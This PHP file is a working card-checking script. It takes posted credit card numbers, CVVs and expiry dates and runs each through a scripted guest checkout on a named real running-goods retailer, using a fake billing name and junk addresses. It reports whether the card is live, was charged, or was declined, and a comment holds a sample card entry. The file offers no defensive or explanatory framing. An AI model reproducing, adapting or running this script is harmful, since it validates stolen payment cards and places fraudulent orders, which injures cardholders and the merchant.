<?php
Class Checker {

	public function curl($url,$post = false,$info = false)
	{
	$curl = curl_init($url);
	if($post !== false)
	{
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl,CURLOPT_POST,1);
	}
		curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
		curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1");
		curl_setopt($curl, CURLOPT_REFERER, "https://www.imvu.com/");
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt($curl,CURLOPT_COOKIEJAR,  'cookie.txt');
		curl_setopt($curl, CURLOPT_COOKIESESSION, true);
	if($info !== false)
	{
		curl_setopt($curl, CURLOPT_URL, $info);
		curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
	}
		$data = curl_exec($curl);
		return $data;
	}

}
header('Access-Control-Allow-Origin: *');
//ccnum=379653647342004&cvv2=3168&cvv2_req=y&ccexpm=11&ccexpy=2020
//$_GET['ccexpy'] //
if($_SERVER['REQUEST_METHOD'] === 'GET'){

	die('CANNOT GET /');
}

extract($_POST,EXTR_PREFIX_SAME, "wddx");
if(!isset($ccnum)|!isset($cvv2)|!isset($ccexpm)|!isset($ccexpy)){
	die('STUPID FUCKING DICK');
}
$checker = new Checker();
$addcart = $checker->curl('https://www.nationalrunningcenter.com/product/3464/index.php','action=AddCart&action=AddCart&num_attributes=1&option1=Berry&qty=1&prod_id=3935&cat_id=12&sku=TW-12SP&addtocart_submit=Add+to+Cart');
$guestcheckout = $checker->curl('https://www.nationalrunningcenter.com/index.php','source_code=INTERNET5&action=Checkout&cr_password=&cr_password_confirm=&username=&password=&contact_phone=&cat_code=&contact_email=vonatya03%40gmail.com&contact_phone=454545454545&submit=Continue+as+Guest&ship_num=1&totalqty=1');
$setaddress = $checker->curl('https://www.nationalrunningcenter.com/index.php','action=CheckoutTotal&alias1=&uship_id1=&req_s_phone=n&req_verify_email=n&s_firstname1=asdasdasd&s_lastname1=adsasdasdasd&s_title1=&s_company1=&s_address11=asdasdasdadsadasd&s_address21=&s_city1=asdasdasd&s_country1=United+States&s_state1=AK&s_zip1=71252&s_email1=asdasd%40asdasd.com&s_phone1=&gift_message1=&s_method1=UPS+Ground&s_shipon1=&choose1=&s_comments=&first_name=asdasdasd&last_name=adsasdasdasd&title=&company=&billing_address1=asdasdasdadsadasd&billing_address2=&billing_city=asdasdasd&billing_country=United+States&billing_state=AK&billing_zip=71252&email=vonatya03%40gmail.com&phone=239-643-5553&payment_method=creditcard&ccname=Thomas+Crenna&ccnum='.$ccnum.'&cvv2='.$cvv2.'&cvv2_req=y&ccexpm='.$ccexpm.'&ccexpy='.$ccexpy.'&gift_certificate=&submit_button=Continue+%3E');
$check = $checker->curl('https://www.nationalrunningcenter.com/index.php','action=CheckoutConfirmation&confirmation_text=Thank+you%2C+%5B%5Bfirst_name%5D%5D+%5B%5Blast_name%5D%5D%2C+for+ordering+from+%5B%5Bco_name%5D%5D.+Your+order+has+been+received.+Below+you+will+find+details+about+your+current+order.+You+may+wish+to+print+and+save+this+confirmation+for+possible+future+reference.&confirmation_special=&to_email=help%40nationalrunningcenter.com&from_email=help%40nationalrunningcenter.com&paypal_express_checkout=n&submit_continue=Place+My+Order');

if(preg_match('/mismatch/',$check))
{
	unlink('cookie.txt');
	echo json_encode(array('status'=>'LIVE NOT CHARGE'));
}
elseif(preg_match('/Order Complete/',$check))
{
	unlink('cookie.txt');
	echo json_encode(array('status'=>'LIVE CHARGE'));
}
elseif(preg_match('/duplicate/',$check))
{
	unlink('cookie.txt');
	echo json_encode(array('status'=>'DUPLICATE'));
}
else
{
	unlink('cookie.txt');
	echo json_encode(array('status'=>'DECLINED'));
}
